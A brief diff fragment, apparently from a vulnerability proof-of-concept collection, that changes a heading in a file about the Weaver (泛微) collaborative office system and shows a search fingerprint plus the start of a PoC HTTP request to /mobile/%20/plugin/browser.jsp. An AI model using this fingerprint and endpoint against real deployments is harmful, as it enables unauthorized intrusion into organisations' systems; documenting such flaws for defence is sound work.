@@ -10,7 +10,7 @@
 app="泛微-协同商务系统"
 ```
 
-## poc
+## POC
 ```
 POST /mobile/%20/plugin/browser.jsp HTTP/1.1
 Host: ip:port
